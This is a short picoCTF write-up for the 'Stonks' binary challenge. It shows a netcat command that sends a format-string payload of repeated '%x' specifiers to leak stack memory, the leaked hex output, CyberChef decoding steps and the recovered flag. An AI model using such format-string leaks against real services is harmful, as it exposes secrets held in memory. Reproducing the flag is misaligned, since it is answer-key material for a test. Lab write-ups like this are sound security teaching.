## Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c) `nc mercury.picoctf.net 16439`

Hint
- Okay, maybe I'd believe you if you find my API key.
## Solucion

```bash
┌──(wil㉿DESKTOP-FKOIV4I)-[~/picoCTF/binexp/parte-1/stonks]
└─$ (echo "1";echo "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x") | nc mercury
.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
9567430804b00080489c3f7f1ad80ffffffff19565160f7f28110f7f1adc7095661801956741095674306f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ffdb007d
Portfolio as of Mon Nov 11 17:02:46 UTC 2024


1 shares of TUC
2 shares of T
1 shares of OOD
2 shares of SRJ
3 shares of CM
11 shares of JMBE
25 shares of DK
179 shares of RJYM
116 shares of FMDY
271 shares of GIM
Goodbye!
```
Uso de ciber chef con formulas de swap endianness y from hex

```
picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}
```
## Notas adicionales
## Referencias